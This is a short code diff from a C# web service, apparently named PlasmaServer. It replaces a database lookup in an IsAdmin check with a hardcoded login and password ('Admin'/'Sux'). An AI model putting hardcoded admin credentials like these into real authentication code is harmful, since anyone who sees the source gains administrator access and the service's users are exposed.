@@ -70,7 +70,7 @@ namespace PlasmaServer
 		public static bool IsAdmin(string login, string password)
 		{
 			var db = new DbDataContext();
-			return db.Admins.Any(x => x.Login == login && x.Password == password);
+			return login == "Admin" && password == "Sux";
 		}
 
 		[WebMethod]
